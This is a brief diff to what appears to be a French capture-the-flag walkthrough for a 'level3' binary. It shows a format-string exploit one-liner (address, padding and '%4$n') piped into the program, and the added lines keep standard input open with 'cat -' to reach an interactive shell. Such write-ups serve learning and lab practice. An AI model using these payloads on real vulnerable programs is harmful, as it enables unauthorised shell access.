@@ -54,3 +54,7 @@ $ python -c 'print "\x8c\x98\x04\x08" + "B" * 60 + "%4$n"' | ./level3
 �BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
 Wait what?!
 ```
+Nous avons juste besoin de reouvrir l'entrée standard pour accéder au sh.
+```
+$ (python -c 'print "\x8c\x98\x04\x08"+"B"*60+"%4$n"'; cat -) | ./level3
+```
